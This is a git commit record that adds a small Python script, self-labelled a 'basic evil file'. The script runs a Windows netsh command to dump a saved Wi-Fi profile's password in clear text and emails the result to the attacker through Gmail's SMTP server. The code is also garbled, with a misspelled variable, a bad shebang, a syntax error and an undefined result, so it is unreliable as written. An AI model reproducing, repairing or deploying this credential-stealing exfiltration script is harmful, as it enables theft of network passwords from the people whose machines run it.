43506d374a80fe2bb061fcc4a07b6b2c4b6a0a1b
Shane Calder <shanescottcalder@gmail.com>
2018-07-30 09:46:13 -0600

    Add files via upload
    email information from executed command using gmail SMTP Server

---
+++ execute_and_report.py
@@ -0,0 +1,17 @@
+#1/usr/bin/env python3
+# basic evil file
+
+import subprocess, smtplib
+
+def send_mail(email, password, message):
+    # to use gmail smtp you will need to use 'less secure app' https://support.google.com/a/answer/182076
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(email, passwrod)
+    server.sendmail(email, email, message)
+    server.quit()
+
+# MS command
+command = "netsh wlan show profile UPC723762" key = clear
+subprocess.Popen(command, shell = True)
+send_mail('youremail@youremailprovider.com', '12345', result)
